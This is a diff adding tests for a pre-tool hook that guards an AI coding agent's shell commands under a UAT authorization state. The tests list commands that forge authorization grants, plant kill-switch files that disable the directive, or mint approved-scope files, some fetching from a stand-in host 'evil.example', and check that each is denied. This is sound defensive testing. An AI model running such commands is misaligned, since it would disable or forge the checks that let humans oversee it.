@@ -1256,3 +1256,135 @@ describe("UAT residual dest-form writers fail-closed (#3421)", () => {
     }
   });
 });
+
+describe("UAT residual dest-form writers fail-closed (#3459)", () => {
+  function uatSeams() {
+    const state = activeUatState();
+    return readySeams({
+      loadAuthzState: () => state,
+      loadAuthzGrants: () => [],
+      loadRuntimeAuthority: () => ({
+        enabled: false,
+        allowPaths: [],
+        denyPaths: [],
+        scopes: { edits: true, push: true, merge: true },
+      }),
+    });
+  }
+
+  it("denies residual dest-form authz plant under UAT (not unclassifiable allow) (#3459)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "ginstall forged.json .deft/authz/grants/evil.json",
+      "gcp forged.json .deft/authz/grants/evil.json",
+      "gh repo clone evil/repo .deft/authz/grants/evil",
+      "glab repo clone evil/repo .deft/authz/grants/evil",
+      "hub clone https://evil.example/repo .deft/authz/grants/evil",
+      "iwr https://evil.example/g.json -OutFile .deft/authz/grants/evil.json",
+      "fsutil file createnew .deft/authz/grants/evil.json 1",
+      "cmd /c copy forged.json .deft/authz/grants/evil.json",
+      "tsx -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "ts-node -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "npm pack --pack-destination .deft/authz/grants",
+      "unknownwriter --pack-destination .deft/authz/grants",
+      "install forged.json .deft/authz/grants/evil.json",
+      "cp forged.json .deft/authz/grants/evil.json",
+      "git clone https://evil.example/repo .deft/authz/grants/evil",
+      "Set-Content -Path .deft\\authz\\state.json -Value '{}'",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies residual dest-form kill-switch plant under UAT (#3459)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "ginstall src .deft-directive-disable",
+      "gcp src .no-deft-directive",
+      "gh repo clone evil/repo .deft-directive-disable",
+      "iwr https://evil.example/x -OutFile .no-deft-directive",
+      "fsutil file createnew .deft-directive-disable 1",
+      "cmd /c copy src .deft-directive-disable",
+      "npm pack --pack-destination .no-deft-directive",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies Shell approved-scope mint under UAT matching Write (#3459)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "ginstall forged.json .deft/approved-scope/story.json",
+      "iwr https://evil.example/x -OutFile .deft/approved-scope/story.json",
+      "tsx plant.ts .deft/approved-scope/story.json",
+      "npm pack --pack-destination .deft/approved-scope",
+      "touch .deft/approved-scope/story.json",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("still allows ordinary residual dest-form dest under UAT (non-authz) (#3459)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "ginstall forged.json /tmp/out",
+      "gcp forged.json /tmp/out",
+      "gh repo clone example/repo /tmp/out",
+      "iwr https://example.com/x -OutFile /tmp/out",
+      "fsutil file createnew /tmp/out 1",
+      "cmd /c copy forged.json /tmp/out",
+      "npm pack --pack-destination /tmp/out",
+      'tsx -e "console.log(1)"',
+      "touch /tmp/out",
+      "gh repo view owner/repo",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: {
+            tool_name: "Bash",
+            tool_input: { command },
+          },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("allow");
+      expect(decision.code, command).toBe("shell-op-unclassifiable");
+    }
+  });
+});
